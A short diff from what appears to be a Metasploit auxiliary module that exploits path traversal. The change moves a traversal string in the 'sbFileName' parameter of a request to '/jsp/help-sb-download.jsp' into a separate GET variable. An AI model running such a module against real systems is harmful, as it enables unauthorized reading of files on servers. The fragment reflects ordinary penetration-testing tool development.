@@ -45,7 +45,10 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/jsp/help-sb-download.jsp?sbFileName=#{traversal}"
+      'uri'    => '/jsp/help-sb-download.jsp',
+      'vars_get' => {
+        'sbFileName' => traversal
+      }
     })
 
     unless res && res.code == 200
